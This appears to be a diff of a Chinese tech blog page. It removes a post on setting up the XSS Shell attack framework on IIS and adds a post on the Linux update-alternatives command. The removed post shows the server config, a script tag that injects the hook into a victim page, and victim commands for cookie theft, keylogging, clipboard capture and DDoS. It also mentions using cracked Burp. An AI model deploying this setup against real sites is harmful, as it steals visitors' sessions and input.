@@ -48,7 +48,7 @@
     
     <title>
         
-            XSS Shell环境搭建及功能介绍 | 
+            分享一个实用的linux软件版本管理软件--update-alternatives | 
         
         ssssdl
     </title>
@@ -59,7 +59,7 @@
 
     <meta name="format-detection" content="telephone=no"/>
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content=",XSS,XSS Shell">
+    <meta name="keywords" content="">
     <meta name="theme-color" content="#0097A7">
 
     <!-- Disable Fucking Bloody Baidu Tranformation -->
@@ -220,7 +220,7 @@
     <!-- WebAPP Icons -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="application-name" content="ssssdl">
-    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/">
+    <meta name="msapplication-starturl" content="http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/">
     <meta name="msapplication-navbutton-color" content="#0097A7">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-title" content="ssssdl">
@@ -239,16 +239,16 @@
     
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/">
+    <meta property="og:url" content="http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="XSS Shell环境搭建及功能介绍 | ssssdl">
+    <meta property="og:title" content="分享一个实用的linux软件版本管理软件--update-alternatives | ssssdl">
     <meta property="og:image" content="/img/favicon.png">
     <meta property="og:description" content="">
-    <meta property="og:article:tag" content="XSS"> <meta property="og:article:tag" content="XSS Shell"> 
+    
 
     
-        <meta property="article:published_time" content="Tue Mar 19 2019 17:21:21 GMT+0800">
-        <meta property="article:modified_time" content="Tue Mar 19 2019 18:19:15 GMT+0800">
+        <meta property="article:published_time" content="Thu Aug 08 2019 16:48:08 GMT+0800">
+        <meta property="article:modified_time" content="Fri Aug 09 2019 11:16:49 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -256,7 +256,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" />
+        <link rel="canonical" href="http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -268,10 +268,10 @@
 {
     "@context": "https://schema.org",
     "@type": "BlogPosting",
-    "mainEntityOfPage": "http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html",
-    "headline": "XSS Shell环境搭建及功能介绍",
-    "datePublished": "Tue Mar 19 2019 17:21:21 GMT+0800",
-    "dateModified": "Tue Mar 19 2019 18:19:15 GMT+0800",
+    "mainEntityOfPage": "http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/index.html",
+    "headline": "分享一个实用的linux软件版本管理软件--update-alternatives",
+    "datePublished": "Thu Aug 08 2019 16:48:08 GMT+0800",
+    "dateModified": "Fri Aug 09 2019 11:16:49 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "ssssdl",
@@ -289,7 +289,7 @@
             "url": "/img/favicon.png"
         }
     },
-    "keywords": ",XSS,XSS Shell",
+    "keywords": "",
     "description": "",
 }
 </script>
@@ -355,7 +355,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-环境"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 环境</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01-配置"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 配置</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#IIS配置-如果IIS已经搭好可以跳过"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">IIS配置(如果IIS已经搭好可以跳过)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS-Shell相关配置。"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">XSS Shell相关配置。</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-使用介绍"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">0x02 使用介绍</span></a></li></ol></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简介（抄的）"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介（抄的）</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#命令的原理"><span class="post-toc-number">2.</span> <span class="post-toc-text">命令的原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#演示"><span class="post-toc-number">3.</span> <span class="post-toc-text">演示</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#单个程序版本控制"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">单个程序版本控制</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#程序包版本控制"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">程序包版本控制</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#结语"><span class="post-toc-number">4.</span> <span class="post-toc-text">结语</span></a></li></ol>
     </ul>
     
 
@@ -387,7 +387,7 @@
         
     
             <p class="article-headline-p">
-                XSS Shell环境搭建及功能介绍
+                分享一个实用的linux软件版本管理软件--update-alternatives
             </p>
         </div>
 
@@ -406,7 +406,7 @@
     <!-- Author Name & Date -->
     <div>
         <strong>ssssdl</strong>
-        <span>3月 19, 2019</span>
+        <span>8月 08, 2019</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -424,15 +424,6 @@
 
     <!-- Tags (bookmark) -->
     
-    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-        <i class="material-icons" role="presentation">bookmark</i>
-        <span class="visuallyhidden">bookmark</span>
-    </button>
-    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
-        <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/XSS/">XSS</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/XSS-Shell/">XSS Shell</a>
-    </ul>
-    
 
     <!-- Share -->
     
@@ -447,7 +438,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=XSS Shell环境搭建及功能介绍&url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html&pic=http://blog.ssssdl.xyz/img/favicon.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=分享一个实用的linux软件版本管理软件--update-alternatives&url=http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/index.html&pic=http://blog.ssssdl.xyz/img/favicon.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -468,7 +459,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=ssssdl&title=XSS Shell环境搭建及功能介绍&summary=&pics=http://blog.ssssdl.xyz/img/favicon.png&url=http://blog.ssssdl.xyz/2019/03/19/XSS-Shell环境搭建及功能介绍/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=ssssdl&title=分享一个实用的linux软件版本管理软件--update-alternatives&summary=&pics=http://blog.ssssdl.xyz/img/favicon.png&url=http://blog.ssssdl.xyz/2019/08/08/分享一个实用的linux软件版本管理软件-update-alternatives/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -487,45 +478,17 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <blockquote>
-<p>感觉网上这个工具的介绍相对BeEF好像比较少，我自己搭建的时候也走了很多弯路</p>
+        <p>哈<del>~</del><del>~</del>喽，观众朋友们大家好，前一阵子需要发现最新的kali的默认java已经不是1.8了，就会导致之前自己一直用的破解的burp就用不了了，然后想换一下kali的java环境，然后就查到了这样一条命令<code>update-alternatives</code> 可以直接修改kali的Java版本，简直太神奇了，而且比较使用，就省的解决各种软件版本问题了，尤其是python和java这种xi，给大家分享一下。</p>
+<h1 id="简介（抄的）"><a href="#简介（抄的）" class="headerlink" title="简介（抄的）"></a>简介（抄的）</h1><blockquote>
+<p><code>update-alternatives</code> 命令用于处理linux系统中软件版本的切换，在各个linux发行版中均提供了该命令，命令参数略有区别，但大致是一样的。</p>
 </blockquote>
-<h1 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h1><blockquote>
-<p>因为这是一个asp的工具，所以这里我采用了一个Windows server 2008 R2 的系统（Windows7什么的也可以）、IIS7的服务器，然后XSS shell来自<a href="https://github.com/portcullislabs/xssshell-xsstunnell" target="_blank" rel="noopener">GitHub</a>,然后因为XSS Shell会将攻击取得的一些数据存入一个shell.mdb的文件，因此如果需要分析的话也需要一个MS Access，但是其实我觉得没有的话也完全没问题，因为我觉得这种工具都是在用户打开被攻击的网页时的一种实时攻击。shell.mdb也可以随时拷到可以分析的机器上。所以攻击服务器上没有也完全没有问题。（说的有点啰嗦）</p>
+<h1 id="命令的原理"><a href="#命令的原理" class="headerlink" title="命令的原理"></a>命令的原理</h1><blockquote>
+<p>看起来很复杂，其实感觉挺简单的，就是一个软连接！的原理，首先你要用<code>update-alternatives</code>设置好你的软件包路径和软连接到的地址（/usr/bin/下），然后当你使用这个命令切换软件版本的时候，这个<code>update-alternatives</code>就会生成对应的软连接，这样如果你是连接到/usr/bin下就可以直接在命令行里面执行了，这个我说起来比较绕口，所以整两个例子：一个是针对应用程序，就是直接可以执行的，一个是针对软件包，需要配环境变量的。</p>
 </blockquote>
-<h1 id="0x01-配置"><a href="#0x01-配置" class="headerlink" title="0x01 配置"></a>0x01 配置</h1><h2 id="IIS配置-如果IIS已经搭好可以跳过"><a href="#IIS配置-如果IIS已经搭好可以跳过" class="headerlink" title="IIS配置(如果IIS已经搭好可以跳过)"></a>IIS配置(如果IIS已经搭好可以跳过)</h2><p><em>IIS这个东西可真是令人头大，图形界面真是好用~     。。。。。。。。。。。。个锤子！</em></p>
-<blockquote>
-<p>直接虚拟机装一个Windows server 2008 R2，然后会默认打开一个初始配置任务，里面自定义此服务器，选择添加角色，然后弹出的面板上面选上IIS，下一步，选上一些关于asp的拓展（ASP,ISAPI扩展，ASP.NET,.NET扩展等），然后安装。然后注意连接的用户要对目录有操作权限，不然可能实验的时候被攻击的浏览器已经打开含有XSS的网页，但是管理员端不显示上线。</p>
-</blockquote>
-<p><strong>注意：以上配置完成后要打开IIS管理器，点击应用程序池，选择右侧的设置应用程序池默认设置，然后把启用32位程序改成ture！</strong></p>
-<h2 id="XSS-Shell相关配置。"><a href="#XSS-Shell相关配置。" class="headerlink" title="XSS Shell相关配置。"></a>XSS Shell相关配置。</h2><ol>
-<li><p>解压GitHub上下载下来的压缩包。有一个XSS Shell的文件夹，存放XSS Shell的asp网站，和监听工具XSSTunnel和这个工具的介绍的PDF文件。</p>
-</li>
-<li><p>打开IIS管理器，打开default web site浏览一下看看网站是否正常运行。如果网页上出现了IIS的logo，没什么异常，就打开default web site的本地目录（默认C:\inetpub\wwwroot），然后把原来的文件删掉（或者备份），把刚才解压出来的XSS shell目录下的文件拷到web目录下。然后把db文件夹剪切到其他不能web访问的目录比如C盘根目录下。</p>
-</li>
-<li><p>接下来开始配置需要配置的文件有xssshell.asp和admin/db.asp</p>
-<blockquote>
-<p>admin/db.asp 这里改成刚才剪切走的db文件夹的位置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;// DATABASE CONFIGURATION</span><br><span class="line">Const DBPATH = &quot;C:\db\shell.mdb&quot;</span><br></pre></td></tr></table></figure>
-</blockquote>
-</li>
-</ol>
-<blockquote>
-<p>admin/db.asp 这里w00t是默认密码，可以根据自己的阿需要修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;// Set Session + password is Case Sensitive</span><br><span class="line">If Pass &lt;&gt; &quot;&quot; Then</span><br><span class="line">	If Trim(Pass) = &quot;w00t&quot; Then Session(&quot;level&quot;) = &quot;ok&quot;</span><br><span class="line">	&apos;Response.Redirect &quot;&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p>xssshell.asp 这里是服务器的链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// You XSSShell Server</span><br><span class="line">var SERVER = &quot;http://192.168.153.132/&quot;; </span><br><span class="line"></span><br><span class="line">// This file&apos;s name</span><br><span class="line">var ME = SERVER + &quot;xssshell.asp?p=1&lt;%=VicAdd%&gt;&quot; ; </span><br><span class="line"></span><br><span class="line">// Connector file</span><br><span class="line">var CONNECTOR = SERVER + &quot;admin/connector.asp&quot;; </span><br><span class="line"></span><br><span class="line">// Commands file</span><br><span class="line">var COMMANDS_URL = SERVER + &quot;admin/commands.asp&quot;;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p>到这里关于xss shell的基本的配置就完成了，xss shell还为我们准备了一个测试页面(/sample_victim目录下的页面)，需要接下来的配置。打开/sample_victim/Default.asp大概在九十几行的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://www.xssshelltest.com:60000/xssshell.asp&quot;&gt;&lt;/script&gt;</span><br><span class="line">//改成你已经配置好的服务器地址</span><br><span class="line">&lt;script src=&quot;http://192.168.153.132/xssshell.asp&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<p><strong>到这里服务器的配置就基本完成了，接下来用其他的浏览器（server 2008自带的浏览器不知道为什么刷新不出内容）打开<a href="http://192.168.153.132/admin" target="_blank" rel="noopener">http://192.168.153.132/admin</a></strong></p>
-<h2 id="0x02-使用介绍"><a href="#0x02-使用介绍" class="headerlink" title="0x02 使用介绍"></a>0x02 使用介绍</h2><p><img src="https://i.loli.net/2019/03/19/5c90a8cdc9821.png" alt="直接翻译，就不解释每个模块都是干什么了"></p>
-<blockquote>
-<p>直接上翻译好的界面，点一下左边的命令受害主机就会执行相应的操作，显示在日志里面，然后有一些比较长的内容点击一下会显示在下面的查看器里面，然后想alert()这种需要参数的，可以写在下面的参数模块里面。。。感觉也没什么好说的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">getCookie()  //获取cookie</span><br><span class="line">Get victims active cookie</span><br><span class="line">getSelfHtml()   //获取页面html，结果是16进制编码过的</span><br><span class="line">Get victim&apos;s current page HTML Code</span><br><span class="line">alert(&lt;message&gt;)  // 弹框 ， 要添加弹框的内容</span><br><span class="line">Send message to victim</span><br><span class="line">eval(&lt;javascript code&gt;) //执行js</span><br><span class="line">Execute virtually anything in JS</span><br><span class="line">prompt(&lt;question&gt;)  //弹输入框，添加弹框的标题，会把受害者的输入写在log里面，有点聊天的感觉</span><br><span class="line">Play Truth or Dare</span><br><span class="line">getKeyloggerData()//键盘记录，有时候可能没什么效果</span><br><span class="line">Get keylogger data</span><br><span class="line">getMouseLog() //获取鼠标点击，和键盘记录一样，有时候可能没有效果</span><br><span class="line">Get mouse log (every click in screen)</span><br><span class="line">getClipboard() //获取剪切板数据，仅限IE</span><br><span class="line">Get clipboard data (only IE)</span><br><span class="line">getInternalIP() // 获取内网IP</span><br><span class="line">Get internal IP address (only Mozilla* + JVM)</span><br><span class="line">checkVisitedLinks(&lt;url list&gt;) //应该是测试受害者是否访问过某网址的（参数是url），但是好像也并不怎么准</span><br><span class="line">Check victim&apos;s history (seperated by new line)</span><br><span class="line">getPage(&lt;Relative URL Path&gt;) //用受害者的平局请求某网页，这个得到的网页不是16进制的,不同源会被拦截掉（火狐：已拦截跨源请求：同源策略禁止读取位于 https://www.bilibili.com/bangumi/play/ep62691v 的远程资源。（原因：CORS 请求未能成功））</span><br><span class="line">Make a request with victim credentials</span><br><span class="line">DDoS(&lt;url&gt;)  \\DDos 某URL（参数） 这个原理好像就是上一篇博客里面最后那个大佬的博客里面的原理（这句话有点绕）</span><br><span class="line">Distributed Denial of Service attack (use &#123;RANDOM&#125; in URL to avoid caching)</span><br><span class="line">Crash()  \\崩溃当前网页，一般不会cpu占用太高（使用7700HQ测试，cpu内心毫无波动，就是网页崩掉了）</span><br><span class="line">Consume victim&apos;s CPU and force to crash/close.</span><br><span class="line">GetLocation() \\获取当前URL （应该就是被攻击者XSS攻击的URL）</span><br><span class="line">Get current URL of victim.</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p>以上测试被攻击者是火狐，admin在谷歌。其他浏览器。。。未测试。。。</p>
+<h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><h2 id="单个程序版本控制"><a href="#单个程序版本控制" class="headerlink" title="单个程序版本控制"></a>单个程序版本控制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ # 首先是Python</span><br><span class="line">~ ᐅ # Ubuntu会自带Python，其映射关系如下</span><br><span class="line">~ ᐅ # lrwxrwxrwx 1 root root       9 Jun 11 05:40 python -&gt; python2.7</span><br><span class="line">~ ᐅ # lrwxrwxrwx 1 root root       9 Jun 11 05:40 python2 -&gt; python2.7</span><br><span class="line">~ ᐅ # -rwxr-xr-x 1 root root    3.5M Nov 27  2018 python2.7</span><br><span class="line">~ ᐅ # lrwxrwxrwx 1 root root       9 Jun 11 05:40 python3 -&gt; python3.6</span><br><span class="line">~ ᐅ # -rwxr-xr-x 2 root root    4.4M Jan 14  2019 python3.6</span><br><span class="line">~ ᐅ # 虽然安装了两个版本的Python，但并没有使用update-alternatives注册 </span><br><span class="line">~ ᐅ # 那就当做Python已经装好了，我们直接使用update-alternatives进行版本控制就可以了   </span><br><span class="line">~ ᐅ # 第一步，将Python注册到update-alternatives      </span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ # 注册python2.7 </span><br><span class="line">~ ᐅ sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 10</span><br><span class="line">update-alternatives: 使用 /usr/bin/python2.7 来在自动模式中提供 /usr/bin/python (python)</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ # install代表注册，后面四个参数分别是：</span><br><span class="line">~ ᐅ # 要产生软连接的目标地址</span><br><span class="line">~ ᐅ # 注册的组件名（后面会使用这个控制版本，相同软件一定相同）</span><br><span class="line">~ ᐅ # 是程序源地址</span><br><span class="line">~ ᐅ # 优先级，越大优先级越高</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ # 注册python3.6</span><br><span class="line">~ ᐅ sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 20</span><br><span class="line">update-alternatives: 使用 /usr/bin/python3.6 来在自动模式中提供 /usr/bin/python (python)</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ # 查看python当前版本</span><br><span class="line">~ ᐅ python --version</span><br><span class="line">Python 3.6.8</span><br><span class="line">~ ᐅ</span><br><span class="line">~ ᐅ # 交互式修改python版本</span><br><span class="line">~ ᐅ sudo update-alternatives --config python</span><br><span class="line">有 2 个候选项可用于替换 python (提供 /usr/bin/python)。</span><br><span class="line"></span><br><span class="line">  选择       路径              优先级  状态</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            /usr/bin/python3.6   20        自动模式</span><br><span class="line">  1            /usr/bin/python2.7   10        手动模式</span><br><span class="line">  2            /usr/bin/python3.6   20        手动模式</span><br><span class="line"></span><br><span class="line">要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：1</span><br><span class="line">update-alternatives: 使用 /usr/bin/python2.7 来在手动模式中提供 /usr/bin/python (python)</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 查看python版本</span><br><span class="line">~ ᐅ python --version</span><br><span class="line">Python 2.7.15+</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 非交互式修改</span><br><span class="line">~ ᐅ sudo update-alternatives --set python /usr/bin/python3.6</span><br><span class="line">update-alternatives: 使用 /usr/bin/python3.6 来在手动模式中提供 /usr/bin/python (python)</span><br><span class="line">~ ᐅ python --version</span><br><span class="line">Python 3.6.8</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 查看python状态</span><br><span class="line">~ ᐅ sudo update-alternatives --display python               </span><br><span class="line">python - 手动模式</span><br><span class="line">  最佳链接版本为 /usr/bin/python3.6</span><br><span class="line"> 链接目前指向 /usr/bin/python3.6</span><br><span class="line">  链接 python 指向 /usr/bin/python</span><br><span class="line">/usr/bin/python2.7 - 优先级 10</span><br><span class="line">/usr/bin/python3.6 - 优先级 20</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 还有删除，设置手动模式啥的就不一一演示了</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ</span><br></pre></td></tr></table></figure>
+<h2 id="程序包版本控制"><a href="#程序包版本控制" class="headerlink" title="程序包版本控制"></a>程序包版本控制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ # 首先下载好软件包，解压好,存到自己想存的路径下（/usr/local）</span><br><span class="line">~ ᐅ # 然后设置环境变量如下(设置环境变量可以修改/etc/profile,也可以~/.bash_profile,然后我用的zsh可以修改~/.zshrc。虽然文件不一样，但添加的内容是一样的)</span><br><span class="line">export JAVA_HOME=/usr/bin/jdk  # 注意这里的jdk是软连接的目标地址</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$PATH:$&#123;JAVA_HOME&#125;/bin</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 然后对我下载的三个jdk进行注册</span><br><span class="line">~ ᐅ sudo update-alternatives --install /usr/bin/jdk java /usr/local/jdk-12.0.1 20</span><br><span class="line">update-alternatives: 使用 /usr/local/jdk-12.0.1 来在自动模式中提供 /usr/bin/jdk (java)</span><br><span class="line">~ ᐅ sudo update-alternatives --install /usr/bin/jdk java /usr/local/jdk1.8.0_221 30          </span><br><span class="line">update-alternatives: 使用 /usr/local/jdk1.8.0_221 来在自动模式中提供 /usr/bin/jdk (java)</span><br><span class="line">~ ᐅ sudo update-alternatives --install /usr/bin/jdk java /usr/local/jdk1.6 10      </span><br><span class="line">~ ᐅ sudo update-alternatives --display java                                  </span><br><span class="line">java - 自动模式</span><br><span class="line">  最佳链接版本为 /usr/local/jdk1.8.0_221</span><br><span class="line"> 链接目前指向 /usr/local/jdk1.8.0_221</span><br><span class="line">  链接 java 指向 /usr/bin/jdk</span><br><span class="line">/usr/local/jdk-12.0.1 - 优先级 20</span><br><span class="line">/usr/local/jdk1.6 - 优先级 10</span><br><span class="line">/usr/local/jdk1.8.0_221 - 优先级 30</span><br><span class="line">~ ᐅ </span><br><span class="line">~ ᐅ # 查看Java版本</span><br><span class="line">~ ᐅ # 可能需要重启一下，发现这个主题还可以计数</span><br><span class="line">[oh-my-zsh] Random theme &apos;/home/ssssdl/.oh-my-zsh/themes/skaro.zsh-theme&apos; loaded...</span><br><span class="line">1 ~  » java -version</span><br><span class="line">java version &quot;1.8.0_221&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_221-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode)</span><br><span class="line">2 ~  » </span><br><span class="line">2 ~  » </span><br><span class="line">2 ~  » # 交互式修改Java版本</span><br><span class="line">3 ~  » sudo update-alternatives --config java</span><br><span class="line">[sudo] ssssdl 的密码： </span><br><span class="line">有 3 个候选项可用于替换 java (提供 /usr/bin/jdk)。</span><br><span class="line"></span><br><span class="line">  选择       路径                   优先级  状态</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            /usr/local/jdk1.8.0_221   30        自动模式</span><br><span class="line">  1            /usr/local/jdk-12.0.1     20        手动模式</span><br><span class="line">  2            /usr/local/jdk1.6         10        手动模式</span><br><span class="line">  3            /usr/local/jdk1.8.0_221   30        手动模式</span><br><span class="line"></span><br><span class="line">要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：1</span><br><span class="line">update-alternatives: 使用 /usr/local/jdk-12.0.1 来在手动模式中提供 /usr/bin/jdk (java)</span><br><span class="line">4 ~  » java -version</span><br><span class="line">java version &quot;12.0.1&quot; 2019-04-16</span><br><span class="line">Java(TM) SE Runtime Environment (build 12.0.1+12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 12.0.1+12, mixed mode, sharing)</span><br><span class="line">5 ~  »</span><br></pre></td></tr></table></figure>
